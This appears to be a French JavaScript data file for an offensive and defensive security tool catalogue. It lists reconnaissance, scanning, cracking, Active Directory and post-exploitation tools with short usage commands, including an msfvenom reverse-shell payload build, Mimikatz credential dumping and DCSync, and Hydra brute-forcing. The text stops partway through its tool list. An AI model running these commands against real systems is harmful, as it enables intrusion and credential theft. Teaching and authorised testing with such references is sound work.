/* =============================================================================
 *  ARSENAL — Base de données des outils & méthodes
 * =============================================================================
 *  Pour AJOUTER un outil : copier un objet dans le tableau TOOLS ci-dessous.
 *  Champs d'un outil :
 *    name      (obligatoire)  Nom affiché
 *    url       (obligatoire)  Lien officiel / dépôt
 *    cat       (obligatoire)  id de catégorie (voir CATEGORIES plus bas)
 *    phases    []             recon | enum | vuln | exploit | post | support
 *    platforms []             linux | windows | macos | web | multi
 *    desc      (obligatoire)  Description courte (FR)
 *    cmd                      Exemple de commande / usage (optionnel)
 *    tags                     Mots-clés pour la recherche (chaîne, séparés par espace)
 *    star      true/false     Outil incontournable (mis en avant)
 *
 *  Pour AJOUTER une catégorie : l'ajouter dans CATEGORIES (id unique).
 *  Pour AJOUTER un cas d'usage (cheat) : l'ajouter dans CHEATS.
 * ========================================================================== */

const META = {
  name: "ARSENAL",
  tagline: "Mémo exhaustif d'outils & méthodes — OSINT · Pentest · Red & Blue Team",
  version: "1.1",
  repo: "https://github.com/" // ← remplace par l'URL de ton dépôt
};

/* ------------------------------------------------------------------ PHASES */
const PHASES = [
  { id: "recon",   label: "Reconnaissance / OSINT" },
  { id: "enum",    label: "Énumération" },
  { id: "vuln",    label: "Analyse de vulnérabilités" },
  { id: "exploit", label: "Exploitation" },
  { id: "post",    label: "Post-exploitation" },
  { id: "support", label: "Support / transverse" }
];

/* -------------------------------------------------------------- CATEGORIES */
const CATEGORIES = [
  { id: "distros",   icon: "🐉", label: "Systèmes & distributions",     desc: "OS et machines d'attaque / d'analyse." },
  { id: "osint",     icon: "🔎", label: "OSINT & reconnaissance",       desc: "Renseignement en source ouverte, empreinte externe." },
  { id: "scan",      icon: "📡", label: "Scan & découverte réseau",     desc: "Hôtes vivants, ports, services, versions, OS." },
  { id: "enum",      icon: "🗂️", label: "Énumération de services",      desc: "SMB, RPC, SNMP, NFS, LDAP, DNS…" },
  { id: "web",       icon: "🌐", label: "Énumération & attaque web",    desc: "Contenus, vhosts, CMS, vulnérabilités applicatives." },
  { id: "vuln",      icon: "🩻", label: "Analyse de vulnérabilités",    desc: "Scanners et bases d'exploits (CVE)." },
  { id: "exploit",   icon: "💥", label: "Exploitation & frameworks",    desc: "Frameworks offensifs et prise de contrôle." },
  { id: "crack",     icon: "🔑", label: "Mots de passe & cracking",     desc: "Bruteforce en ligne / hors-ligne, hashes." },
  { id: "ad",        icon: "🏰", label: "Active Directory",             desc: "Énumération et attaque de domaines Windows." },
  { id: "post",      icon: "⬆️", label: "Post-exploitation & privesc",  desc: "Élévation de privilèges, persistance, loot." },
  { id: "pivot",     icon: "🧅", label: "Shells, tunneling & pivot",    desc: "Reverse/bind shells, tunnels, rebond réseau." },
  { id: "sniff",     icon: "🎧", label: "Sniffing & MITM",             desc: "Capture et interception du trafic." },
  { id: "wireless",  icon: "📶", label: "Wi-Fi & sans-fil",            desc: "Audit des réseaux sans fil." },
  { id: "wordlists", icon: "📜", label: "Wordlists & payloads",        desc: "Dictionnaires et charges prêtes à l'emploi." },
  { id: "refs",      icon: "📚", label: "Références & LOLBINs",         desc: "Cheat-sheets vivantes : GTFOBins, LOLBAS…" },
  { id: "method",    icon: "🧭", label: "Méthodologies & frameworks",   desc: "Cadres de test et référentiels." },
  { id: "forensic",  icon: "🔬", label: "Reverse & forensic",           desc: "Analyse de binaires, de mémoire et investigation numérique." },
  { id: "blue",      icon: "🛡️", label: "Blue Team / SOC & détection",   desc: "Supervision, détection, CTI, SIEM et réponse à incident." },
  { id: "train",     icon: "🎯", label: "Entraînement & labs",          desc: "Plateformes et environnements vulnérables pour s'exercer légalement." }
];

/* ------------------------------------------------------------------- TOOLS */
const TOOLS = [

  /* ===== Systèmes & distributions ===== */
  { name: "Kali Linux", url: "https://www.kali.org/", cat: "distros", platforms: ["linux"], phases: ["support"], star: true,
    desc: "Distribution de référence pour le test d'intrusion : des centaines d'outils offensifs préinstallés.",
    tags: "debian pentest distribution vm attaquant live" },
  { name: "Parrot OS (Security)", url: "https://parrotsec.org/", cat: "distros", platforms: ["linux"], phases: ["support"],
    desc: "Alternative à Kali, orientée sécurité et anonymat, plus légère.", tags: "debian distribution anonymat" },
  { name: "BlackArch", url: "https://blackarch.org/", cat: "distros", platforms: ["linux"], phases: ["support"],
    desc: "Dérivé d'Arch Linux avec 2800+ outils offensifs (repo additionnel installable).", tags: "arch distribution rolling" },
  { name: "Commando VM", url: "https://github.com/mandiant/commando-vm", cat: "distros", platforms: ["windows"], phases: ["support"],
    desc: "Transforme un Windows en poste d'attaque (équivalent Kali côté Windows).", tags: "windows mandiant offensive ad" },
  { name: "FLARE-VM", url: "https://github.com/mandiant/flare-vm", cat: "distros", platforms: ["windows"], phases: ["support"],
    desc: "Environnement Windows d'analyse de malware et de reverse engineering.", tags: "malware reverse analyse windows" },
  { name: "REMnux", url: "https://remnux.org/", cat: "distros", platforms: ["linux"], phases: ["support"],
    desc: "Distribution Linux dédiée à l'analyse de code malveillant.", tags: "malware reverse forensic" },
  { name: "Tails", url: "https://tails.net/", cat: "distros", platforms: ["linux"], phases: ["recon"],
    desc: "OS live amnésique routant tout via Tor — anonymat pour la recon passive.", tags: "anonymat tor live osint" },
  { name: "Tsurugi Linux", url: "https://tsurugi-linux.org/", cat: "distros", platforms: ["linux"], phases: ["support"],
    desc: "Distribution orientée forensic numérique et OSINT.", tags: "forensic osint dfir" },

  /* ===== OSINT & reconnaissance ===== */
  { name: "theHarvester", url: "https://github.com/laramies/theHarvester", cat: "osint", platforms: ["linux"], phases: ["recon"], star: true,
    desc: "Collecte emails, sous-domaines, hôtes et noms à partir de sources publiques.", cmd: "theHarvester -d example.com -b all",
    tags: "email sous-domaine recon passive moteur" },
  { name: "Maltego", url: "https://www.maltego.com/", cat: "osint", platforms: ["multi"], phases: ["recon"],
    desc: "Cartographie graphique de liens entre personnes, domaines, infrastructures.", tags: "graphe lien transform entite" },
  { name: "SpiderFoot", url: "https://github.com/smicallef/spiderfoot", cat: "osint", platforms: ["multi"], phases: ["recon"],
    desc: "Automatisation OSINT : 200+ modules croisant des dizaines de sources.", cmd: "python3 sf.py -l 127.0.0.1:5001",
    tags: "automatisation recon reconnaissance empreinte" },
  { name: "Recon-ng", url: "https://github.com/lanmaster53/recon-ng", cat: "osint", platforms: ["linux"], phases: ["recon"],
    desc: "Framework de reconnaissance modulaire façon Metasploit.", cmd: "recon-ng -w projet", tags: "framework module recon" },
  { name: "Shodan", url: "https://www.shodan.io/", cat: "osint", platforms: ["web"], phases: ["recon"], star: true,
    desc: "Moteur de recherche des objets connectés : services, bannières, CVE exposées.", cmd: "shodan search 'port:445 country:FR'",
    tags: "iot moteur bannière exposition internet" },
  { name: "Censys", url: "https://search.censys.io/", cat: "osint", platforms: ["web"], phases: ["recon"],
    desc: "Inventaire d'hôtes et de certificats exposés sur Internet.", tags: "certificat hote exposition moteur" },
  { name: "crt.sh", url: "https://crt.sh/", cat: "osint", platforms: ["web"], phases: ["recon"], star: true,
    desc: "Sous-domaines via les journaux de transparence des certificats SSL/TLS.", cmd: "%.example.com (dans la recherche crt.sh)",
    tags: "certificat sous-domaine ssl tls subdomain" },
  { name: "Amass", url: "https://github.com/owasp-amass/amass", cat: "osint", platforms: ["linux"], phases: ["recon"],
    desc: "Cartographie exhaustive de la surface d'attaque et énumération de sous-domaines (OWASP).", cmd: "amass enum -d example.com",
    tags: "sous-domaine owasp surface dns" },
  { name: "Sublist3r", url: "https://github.com/aboul3la/Sublist3r", cat: "osint", platforms: ["linux"], phases: ["recon"],
    desc: "Énumération rapide de sous-domaines via moteurs de recherche.", cmd: "sublist3r -d example.com", tags: "sous-domaine subdomain rapide" },
  { name: "dnsenum", url: "https://github.com/fwaeytens/dnsenum", cat: "osint", platforms: ["linux"], phases: ["recon","enum"],
    desc: "Énumération DNS : enregistrements, sous-domaines, tentative de transfert de zone.", cmd: "dnsenum example.com",
    tags: "dns sous-domaine axfr transfert zone" },
  { name: "dnsrecon", url: "https://github.com/darkoperator/dnsrecon", cat: "osint", platforms: ["linux"], phases: ["recon","enum"],
    desc: "Reconnaissance DNS avancée (enregistrements, bruteforce, AXFR).", cmd: "dnsrecon -d example.com", tags: "dns axfr bruteforce" },
  { name: "whois / dig / host", url: "https://linux.die.net/man/1/dig", cat: "osint", platforms: ["linux"], phases: ["recon","enum"], star: true,
    desc: "Outils de base : propriétaire de domaine, enregistrements DNS, SPF/DKIM/DMARC.", cmd: "whois example.com ; dig example.com ANY ; dig txt example.com",
    tags: "dns whois spf dkim dmarc base" },
  { name: "ExifTool", url: "https://exiftool.org/", cat: "osint", platforms: ["multi"], phases: ["recon"],
    desc: "Extraction de métadonnées de documents/images (auteurs, logiciels, géoloc).", cmd: "exiftool document.pdf",
    tags: "metadonnee exif document fuite geoloc" },
  { name: "Metagoofil", url: "https://github.com/opsdisk/metagoofil", cat: "osint", platforms: ["linux"], phases: ["recon"],
    desc: "Télécharge les documents publics d'un domaine et en extrait les métadonnées.", tags: "metadonnee document fuite" },
  { name: "FOCA", url: "https://github.com/ElevenPaths/FOCA", cat: "osint", platforms: ["windows"], phases: ["recon"],
    desc: "Analyse des métadonnées de documents exposés pour cartographier une organisation.", tags: "metadonnee document windows" },
  { name: "Google Dorks (GHDB)", url: "https://www.exploit-db.com/google-hacking-database", cat: "osint", platforms: ["web"], phases: ["recon"], star: true,
    desc: "Requêtes ciblées pour débusquer fichiers et pages exposés (Google Hacking Database).", cmd: "site:example.com filetype:pdf",
    tags: "google dork ghdb recherche fichier exposition" },
  { name: "Have I Been Pwned", url: "https://haveibeenpwned.com/", cat: "osint", platforms: ["web"], phases: ["recon"],
    desc: "Vérifie si une adresse/email apparaît dans des fuites de données connues.", tags: "leak fuite email breach mot-de-passe" },
  { name: "DeHashed", url: "https://dehashed.com/", cat: "osint", platforms: ["web"], phases: ["recon"],
    desc: "Recherche dans de vastes bases de fuites (emails, identifiants, hashes).", tags: "leak fuite credential base" },
  { name: "Intelligence X", url: "https://intelx.io/", cat: "osint", platforms: ["web"], phases: ["recon"],
    desc: "Moteur de recherche sur fuites, darkweb, pastes et documents.", tags: "leak darkweb paste intelx" },
  { name: "Sherlock", url: "https://github.com/sherlock-project/sherlock", cat: "osint", platforms: ["linux"], phases: ["recon"], star: true,
    desc: "Retrouve un pseudo sur des centaines de réseaux sociaux.", cmd: "sherlock pseudo", tags: "username pseudo reseaux sociaux personne" },
  { name: "Maigret", url: "https://github.com/soxoj/maigret", cat: "osint", platforms: ["linux"], phases: ["recon"],
    desc: "Profilage d'un pseudo sur 2500+ sites, avec extraction d'infos.", cmd: "maigret pseudo", tags: "username pseudo profil personne" },
  { name: "Holehe", url: "https://github.com/megadose/holehe", cat: "osint", platforms: ["linux"], phases: ["recon"],
    desc: "Teste sur quels sites une adresse email est enregistrée.", cmd: "holehe cible@example.com", tags: "email compte inscription personne" },
  { name: "GHunt", url: "https://github.com/mxrch/GHunt", cat: "osint", platforms: ["linux"], phases: ["recon"],
    desc: "Investigation sur un compte Google (nom, avatar, services, avis).", cmd: "ghunt email cible@gmail.com", tags: "google compte email personne" },

  /* ===== Scan & découverte réseau ===== */
  { name: "Nmap", url: "https://nmap.org/", cat: "scan", platforms: ["multi"], phases: ["enum","vuln"], star: true,
    desc: "Le scanner de référence : hôtes, ports, services, versions, OS, scripts NSE.", cmd: "nmap -sS -sV -O -sC -oA scan <ip>",
    tags: "scan port service version os nse fingerprint" },
  { name: "netdiscover", url: "https://github.com/netdiscover-scanner/netdiscover", cat: "scan", platforms: ["linux"], phases: ["enum"], star: true,
    desc: "Découverte d'hôtes actifs par requêtes ARP (réseau local).", cmd: "netdiscover -r 10.10.10.0/24", tags: "arp decouverte hote reseau local" },
  { name: "RustScan", url: "https://github.com/RustScan/RustScan", cat: "scan", platforms: ["multi"], phases: ["enum"],
    desc: "Scanner de ports ultra-rapide qui relaie les ports ouverts à Nmap.", cmd: "rustscan -a <ip> -- -sV -sC", tags: "port rapide rust nmap" },
  { name: "Masscan", url: "https://github.com/robertdavidgraham/masscan", cat: "scan", platforms: ["multi"], phases: ["enum"],
    desc: "Scan de ports à l'échelle d'Internet (très haut débit).", cmd: "masscan -p1-65535 <net> --rate=10000", tags: "port masse rapide internet" },
  { name: "AutoRecon", url: "https://github.com/Tib3rius/AutoRecon", cat: "scan", platforms: ["linux"], phases: ["enum"],
    desc: "Automatise l'énumération multi-services à partir d'un scan de ports.", cmd: "autorecon <ip>", tags: "automatisation enum oscp multi" },
  { name: "nbtscan", url: "https://github.com/resurrecting-open-source-projects/nbtscan", cat: "scan", platforms: ["linux"], phases: ["enum"],
    desc: "Scan des noms NetBIOS sur un réseau.", cmd: "nbtscan 10.10.10.0/24", tags: "netbios nom smb reseau" },

  /* ===== Énumération de services ===== */
  { name: "enum4linux-ng", url: "https://github.com/cddmp/enum4linux-ng", cat: "enum", platforms: ["linux"], phases: ["enum"], star: true,
    desc: "Énumération SMB/RPC moderne : utilisateurs, partages, politique de mots de passe.", cmd: "enum4linux-ng -A <ip>",
    tags: "smb rpc netbios users shares policy rid" },
  { name: "enum4linux", url: "https://github.com/CiscoCXSecurity/enum4linux", cat: "enum", platforms: ["linux"], phases: ["enum"],
    desc: "Script historique d'énumération SMB/RPC (users, shares, policy).", cmd: "enum4linux -a <ip>", tags: "smb rpc users shares" },
  { name: "smbmap", url: "https://github.com/ShawnDEvans/smbmap", cat: "enum", platforms: ["linux"], phases: ["enum"], star: true,
    desc: "Liste les partages SMB et leurs droits, parcourt et télécharge le contenu.", cmd: "smbmap -H <ip> -R",
    tags: "smb partage share droit recursif anonyme" },
  { name: "smbclient", url: "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html", cat: "enum", platforms: ["linux"], phases: ["enum"], star: true,
    desc: "Client SMB : lister et se connecter aux partages, y compris en anonyme.", cmd: "smbclient -L //<ip>/ -N",
    tags: "smb partage null session anonyme samba" },
  { name: "rpcclient", url: "https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html", cat: "enum", platforms: ["linux"], phases: ["enum"],
    desc: "Interrogation MS-RPC : énumération users/groupes en session nulle.", cmd: "rpcclient -U \"\" -N <ip>", tags: "rpc session nulle users enumdomusers" },
  { name: "snmpwalk", url: "http://www.net-snmp.org/", cat: "enum", platforms: ["linux"], phases: ["enum"], star: true,
    desc: "Parcourt l'arbre SNMP ; la communauté 'public' fuit toute la config système.", cmd: "snmpwalk -v2c -c public <ip>",
    tags: "snmp public communaute oid processus fuite" },
  { name: "snmp-check", url: "https://gitlab.com/kalilinux/packages/snmpcheck", cat: "enum", platforms: ["linux"], phases: ["enum"],
    desc: "Synthèse lisible SNMP : système, processus, logiciels, interfaces, FS.", cmd: "snmp-check -c public <ip>", tags: "snmp public synthese systeme" },
  { name: "onesixtyone", url: "https://github.com/trailofbits/onesixtyone", cat: "enum", platforms: ["linux"], phases: ["enum"],
    desc: "Bruteforce rapide des communautés SNMP.", cmd: "onesixtyone -c communities.txt <ip>", tags: "snmp communaute bruteforce" },
  { name: "showmount / NFS", url: "https://linux.die.net/man/8/showmount", cat: "enum", platforms: ["linux"], phases: ["enum"],
    desc: "Liste les exports NFS, puis montage pour vérifier les droits réels.", cmd: "showmount -e <ip> ; mount -t nfs <ip>:/export /mnt",
    tags: "nfs export mount partage droit" },
  { name: "ldapsearch", url: "https://linux.die.net/man/1/ldapsearch", cat: "enum", platforms: ["linux"], phases: ["enum"],
    desc: "Interroge un annuaire LDAP, y compris la racine (rootDSE) en anonyme.", cmd: "ldapsearch -x -H ldap://<ip> -s base", tags: "ldap rootdse annuaire ad anonyme" },

  /* ===== Énumération & attaque web ===== */
  { name: "Gobuster", url: "https://github.com/OJ/gobuster", cat: "web", platforms: ["multi"], phases: ["enum"], star: true,
    desc: "Bruteforce de répertoires/fichiers, DNS et vhosts.", cmd: "gobuster dir -u http://<ip> -w wordlist.txt", tags: "web dir fuzzing vhost dns bruteforce" },
  { name: "ffuf", url: "https://github.com/ffuf/ffuf", cat: "web", platforms: ["multi"], phases: ["enum"], star: true,
    desc: "Fuzzer web très rapide (répertoires, paramètres, vhosts).", cmd: "ffuf -u http://<ip>/FUZZ -w wordlist.txt", tags: "web fuzzing parametre vhost rapide" },
  { name: "feroxbuster", url: "https://github.com/epi052/feroxbuster", cat: "web", platforms: ["multi"], phases: ["enum"],
    desc: "Découverte de contenu web récursive, écrite en Rust.", cmd: "feroxbuster -u http://<ip>", tags: "web dir recursif rust" },
  { name: "dirb / dirsearch", url: "https://github.com/maurosoria/dirsearch", cat: "web", platforms: ["linux"], phases: ["enum"],
    desc: "Bruteforce de chemins web (classiques).", cmd: "dirsearch -u http://<ip>", tags: "web dir bruteforce chemin" },
  { name: "WhatWeb", url: "https://github.com/urbanadventurer/WhatWeb", cat: "web", platforms: ["linux"], phases: ["enum"],
    desc: "Identifie technologies, CMS, serveurs et versions d'un site.", cmd: "whatweb http://<ip>", tags: "web techno cms fingerprint" },
  { name: "Nikto", url: "https://github.com/sullo/nikto", cat: "web", platforms: ["linux"], phases: ["vuln"], star: true,
    desc: "Scanner de vulnérabilités web : fichiers dangereux, mauvaises configs.", cmd: "nikto -h http://<ip>", tags: "web scanner vulnerabilite config" },
  { name: "WPScan", url: "https://github.com/wpscanteam/wpscan", cat: "web", platforms: ["linux"], phases: ["vuln"],
    desc: "Scanner spécialisé WordPress (plugins, thèmes, utilisateurs, CVE).", cmd: "wpscan --url http://<ip> --enumerate u", tags: "wordpress cms plugin theme" },
  { name: "Burp Suite", url: "https://portswigger.net/burp", cat: "web", platforms: ["multi"], phases: ["exploit"], star: true,
    desc: "Proxy d'interception web : analyse, modification et attaque des requêtes HTTP.", tags: "proxy http interception web manuel repeater intruder" },
  { name: "OWASP ZAP", url: "https://www.zaproxy.org/", cat: "web", platforms: ["multi"], phases: ["exploit"],
    desc: "Proxy d'interception open source avec scan actif/passif.", tags: "proxy http owasp scan web gratuit" },
  { name: "sqlmap", url: "https://github.com/sqlmapproject/sqlmap", cat: "web", platforms: ["multi"], phases: ["exploit"], star: true,
    desc: "Détection et exploitation automatisée des injections SQL.", cmd: "sqlmap -u 'http://<ip>/?id=1' --dbs", tags: "sql injection base donnee dump" },
  { name: "wafw00f", url: "https://github.com/EnableSecurity/wafw00f", cat: "web", platforms: ["linux"], phases: ["enum"],
    desc: "Identifie la présence et le type d'un pare-feu applicatif (WAF).", cmd: "wafw00f http://<ip>", tags: "waf pare-feu web detection" },
  { name: "EyeWitness", url: "https://github.com/RedSiege/EyeWitness", cat: "web", platforms: ["linux"], phases: ["enum"], star: true,
    desc: "Captures d'écran automatiques des interfaces web (à partir d'un scan Nmap).", cmd: "eyewitness -x scan.xml -d ./shots", tags: "screenshot web interface capture" },
  { name: "Aquatone / gowitness", url: "https://github.com/sensepost/aquatone", cat: "web", platforms: ["multi"], phases: ["enum"],
    desc: "Captures d'écran de masse pour trier visuellement de nombreux hôtes web.", tags: "screenshot web masse tri" },
  { name: "XSStrike", url: "https://github.com/s0md3v/XSStrike", cat: "web", platforms: ["linux"], phases: ["exploit"],
    desc: "Détection et exploitation avancée des failles XSS.", cmd: "xsstrike -u 'http://<ip>/?q=test'", tags: "xss injection web payload" },

  /* ===== Analyse de vulnérabilités ===== */
  { name: "OpenVAS / Greenbone", url: "https://www.greenbone.net/", cat: "vuln", platforms: ["linux"], phases: ["vuln"], star: true,
    desc: "Scanner de vulnérabilités complet (fork de Nessus), piloté via interface web.", tags: "scanner cve nessus greenbone reseau rapport" },
  { name: "Nessus", url: "https://www.tenable.com/products/nessus", cat: "vuln", platforms: ["multi"], phases: ["vuln"],
    desc: "Scanner de vulnérabilités commercial de référence.", tags: "scanner cve tenable commercial" },
  { name: "Nuclei", url: "https://github.com/projectdiscovery/nuclei", cat: "vuln", platforms: ["multi"], phases: ["vuln"], star: true,
    desc: "Scanner basé sur des templates communautaires (web & réseau), rapide et ciblé.", cmd: "nuclei -u http://<ip>", tags: "template cve web rapide projectdiscovery" },
  { name: "searchsploit", url: "https://www.exploit-db.com/searchsploit", cat: "vuln", platforms: ["linux"], phases: ["vuln","exploit"], star: true,
    desc: "Recherche hors-ligne dans Exploit-DB à partir d'un produit/version.", cmd: "searchsploit apache 2.4", tags: "exploit-db exploit cve recherche offline" },
  { name: "Nmap NSE (vuln)", url: "https://nmap.org/nsedoc/categories/vuln.html", cat: "vuln", platforms: ["multi"], phases: ["vuln"],
    desc: "Scripts Nmap de détection de vulnérabilités.", cmd: "nmap --script vuln <ip>", tags: "nmap nse script vulnerabilite" },
  { name: "Linux/Windows Exploit Suggester", url: "https://github.com/mzet-/linux-exploit-suggester", cat: "vuln", platforms: ["multi"], phases: ["vuln","post"],
    desc: "Propose des exploits selon le noyau/les correctifs manquants de la cible.", cmd: "./linux-exploit-suggester.sh", tags: "privesc kernel exploit suggester patch" },

  /* ===== Exploitation & frameworks ===== */
  { name: "Metasploit Framework", url: "https://www.metasploit.com/", cat: "exploit", platforms: ["multi"], phases: ["exploit","post"], star: true,
    desc: "Framework offensif : exploits, payloads, auxiliary, post, encoders. Console msfconsole.", cmd: "msfconsole ; use <exploit> ; set RHOSTS/LHOST/payload ; exploit",
    tags: "framework exploit payload meterpreter msf session auxiliary" },
  { name: "msfvenom", url: "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html", cat: "exploit", platforms: ["multi"], phases: ["exploit"], star: true,
    desc: "Générateur de payloads autonomes (exe, elf, php, aspx, shellcode…).", cmd: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o s.exe",
    tags: "payload reverse shell generateur shellcode encoder" },
  { name: "Exploit-DB", url: "https://www.exploit-db.com/", cat: "exploit", platforms: ["web"], phases: ["vuln","exploit"], star: true,
    desc: "Base publique d'exploits et de PoC référencés par CVE.", tags: "exploit cve poc base publique" },
  { name: "Cobalt Strike", url: "https://www.cobaltstrike.com/", cat: "exploit", platforms: ["multi"], phases: ["exploit","post"],
    desc: "Framework C2 commercial de référence pour les opérations Red Team.", tags: "c2 redteam beacon commercial command control" },
  { name: "Sliver", url: "https://github.com/BishopFox/sliver", cat: "exploit", platforms: ["multi"], phases: ["exploit","post"],
    desc: "Framework C2 open source multiplateforme (alternative à Cobalt Strike).", tags: "c2 redteam implant open source command control" },
  { name: "Impacket", url: "https://github.com/fortra/impacket", cat: "exploit", platforms: ["linux"], phases: ["exploit","post"], star: true,
    desc: "Boîte à outils Python réseau Windows : psexec, wmiexec, secretsdump, smbserver…", cmd: "impacket-psexec DOMAINE/user:pass@<ip>",
    tags: "smb wmi psexec secretsdump ntlm windows reseau python" },
  { name: "Metasploit Unleashed", url: "https://www.offsec.com/metasploit-unleashed/", cat: "exploit", platforms: ["web"], phases: ["exploit"],
    desc: "Cours gratuit de référence pour maîtriser Metasploit de bout en bout.", tags: "cours metasploit apprentissage offsec" },

  /* ===== Mots de passe & cracking ===== */
  { name: "Hydra", url: "https://github.com/vanhauser-thc/thc-hydra", cat: "crack", platforms: ["multi"], phases: ["exploit"], star: true,
    desc: "Bruteforce d'authentification en ligne (SSH, FTP, HTTP, RDP, SMB…).", cmd: "hydra -l user -P rockyou.txt ssh://<ip>", tags: "bruteforce en ligne ssh ftp http login password" },
  { name: "Hashcat", url: "https://hashcat.net/hashcat/", cat: "crack", platforms: ["multi"], phases: ["exploit"], star: true,
    desc: "Cassage de hashes hors-ligne accéléré GPU (NTLM, MD5, bcrypt…).", cmd: "hashcat -m 1000 -a 0 hash.txt rockyou.txt", tags: "hash offline gpu ntlm crack dictionnaire" },
  { name: "John the Ripper", url: "https://www.openwall.com/john/", cat: "crack", platforms: ["multi"], phases: ["exploit"], star: true,
    desc: "Cassage de mots de passe polyvalent ; nombreux formats et *2john.", cmd: "john --wordlist=rockyou.txt hash.txt", tags: "hash offline crack john format" },
  { name: "Medusa", url: "https://github.com/jmk-foofus/medusa", cat: "crack", platforms: ["linux"], phases: ["exploit"],
    desc: "Bruteforce en ligne rapide et modulaire (alternative à Hydra).", cmd: "medusa -h <ip> -u user -P rockyou.txt -M ssh", tags: "bruteforce en ligne login" },
  { name: "CeWL", url: "https://github.com/digininja/CeWL", cat: "crack", platforms: ["linux"], phases: ["exploit"],
    desc: "Génère une wordlist contextuelle en aspirant un site web.", cmd: "cewl http://<ip> -w wordlist.txt", tags: "wordlist contexte site generation" },
  { name: "Crunch", url: "https://github.com/crunchsec/crunch", cat: "crack", platforms: ["linux"], phases: ["exploit"],
    desc: "Génère des wordlists selon des motifs (longueur, jeu de caractères).", cmd: "crunch 8 8 -t pass%%%% -o wl.txt", tags: "wordlist generation motif" },
  { name: "hash-identifier / hashid", url: "https://github.com/psypanda/hashID", cat: "crack", platforms: ["linux"], phases: ["exploit"],
    desc: "Identifie le type d'un hash avant de choisir le mode de cassage.", cmd: "hashid '<hash>'", tags: "hash identification type mode" },
  { name: "CrackStation", url: "https://crackstation.net/", cat: "crack", platforms: ["web"], phases: ["exploit"],
    desc: "Lookup en ligne de hashes non salés via rainbow tables massives.", tags: "hash rainbow lookup en ligne" },

  /* ===== Active Directory ===== */
  { name: "BloodHound", url: "https://github.com/SpecterOps/BloodHound", cat: "ad", platforms: ["multi"], phases: ["enum","post"], star: true,
    desc: "Cartographie les chemins d'attaque dans un domaine AD via la théorie des graphes.", cmd: "bloodhound-python -d esdown.local -u user -p pass -c all",
    tags: "active directory graphe chemin privilege collector sharphound" },
  { name: "NetExec (ex-CrackMapExec)", url: "https://github.com/Pennyw0rth/NetExec", cat: "ad", platforms: ["linux"], phases: ["enum","post"], star: true,
    desc: "Couteau suisse AD/SMB : spray, pass-the-hash, exécution, énumération de masse.", cmd: "nxc smb <net> -u user -H <hash>",
    tags: "crackmapexec cme smb winrm pass-the-hash spray enum laterale" },
  { name: "Responder", url: "https://github.com/lgandx/Responder", cat: "ad", platforms: ["linux"], phases: ["enum","exploit"], star: true,
    desc: "Empoisonne LLMNR/NBT-NS/mDNS pour capturer des hashes NetNTLM.", cmd: "responder -I eth0", tags: "llmnr nbtns poisoning netntlm hash mitm capture" },
  { name: "Mimikatz", url: "https://github.com/gentilkiwi/mimikatz", cat: "ad", platforms: ["windows"], phases: ["post"], star: true,
    desc: "Extraction d'identifiants Windows (LSASS, SAM, tickets), DCSync, pass-the-hash.", cmd: "sekurlsa::logonpasswords ; lsadump::dcsync /user:krbtgt",
    tags: "credential lsass sam dcsync kerberos ticket golden kiwi" },
  { name: "Rubeus", url: "https://github.com/GhostPack/Rubeus", cat: "ad", platforms: ["windows"], phases: ["post"],
    desc: "Abus de Kerberos : kerberoasting, AS-REP roasting, pass-the-ticket.", cmd: "Rubeus.exe kerberoast", tags: "kerberos kerberoast asrep ticket pass-the-ticket" },
  { name: "Kerbrute", url: "https://github.com/ropnop/kerbrute", cat: "ad", platforms: ["multi"], phases: ["enum","exploit"],
    desc: "Énumération d'utilisateurs et spraying via pré-authentification Kerberos.", cmd: "kerbrute userenum -d esdown.local users.txt", tags: "kerberos user enum spray" },
  { name: "Certipy", url: "https://github.com/ly4k/Certipy", cat: "ad", platforms: ["linux"], phases: ["enum","post"],
    desc: "Énumération et abus d'AD Certificate Services (ESC1-ESC8).", cmd: "certipy find -u user@esdown.local -p pass", tags: "adcs certificat esc kerberos" },
  { name: "evil-winrm", url: "https://github.com/Hackplayers/evil-winrm", cat: "ad", platforms: ["linux"], phases: ["post"], star: true,
    desc: "Shell WinRM interactif (identifiants ou pass-the-hash) sur cible Windows.", cmd: "evil-winrm -i <ip> -u user -H <hash>", tags: "winrm shell windows pass-the-hash laterale" },
  { name: "ldapdomaindump", url: "https://github.com/dirkjanm/ldapdomaindump", cat: "ad", platforms: ["linux"], phases: ["enum"],
    desc: "Dump complet d'un domaine AD via LDAP en rapports HTML/JSON exploitables.", cmd: "ldapdomaindump -u 'DOM\\user' -p pass <ip>", tags: "ldap dump domaine users groupes" },
  { name: "PingCastle", url: "https://www.pingcastle.com/", cat: "ad", platforms: ["windows"], phases: ["vuln"],
    desc: "Audit de posture de sécurité d'un Active Directory avec score de risque.", tags: "audit ad posture score rapport" },
  { name: "PowerView / PowerSploit", url: "https://github.com/PowerShellMafia/PowerSploit", cat: "ad", platforms: ["windows"], phases: ["enum","post"],
    desc: "Énumération AD et post-exploitation en PowerShell.", cmd: "Get-NetUser ; Get-NetGroup", tags: "powershell ad enum reconnaissance" },

  /* ===== Post-exploitation & privesc ===== */
  { name: "LinPEAS", url: "https://github.com/peass-ng/PEASS-ng", cat: "post", platforms: ["linux"], phases: ["post"], star: true,
    desc: "Énumération locale Linux exhaustive pour repérer les voies d'élévation.", cmd: "./linpeas.sh", tags: "privesc linux enumeration peass suid cron" },
  { name: "WinPEAS", url: "https://github.com/peass-ng/PEASS-ng", cat: "post", platforms: ["windows"], phases: ["post"], star: true,
    desc: "Équivalent de LinPEAS pour Windows (services, droits, creds stockés).", cmd: "winpeas.exe", tags: "privesc windows enumeration peass service token" },
  { name: "pspy", url: "https://github.com/DominicBreuker/pspy", cat: "post", platforms: ["linux"], phases: ["post"],
    desc: "Observe les processus et tâches cron sans privilèges root.", cmd: "./pspy64", tags: "process cron surveillance linux sans-root" },
  { name: "PowerUp", url: "https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc", cat: "post", platforms: ["windows"], phases: ["post"],
    desc: "Recherche de mauvaises configs d'élévation de privilèges Windows.", cmd: "Invoke-AllChecks", tags: "privesc windows service powershell config" },
  { name: "Seatbelt", url: "https://github.com/GhostPack/Seatbelt", cat: "post", platforms: ["windows"], phases: ["post"],
    desc: "Collecte de données de sécurité host-based pour la post-exploitation.", cmd: "Seatbelt.exe -group=all", tags: "windows enumeration host situational" },
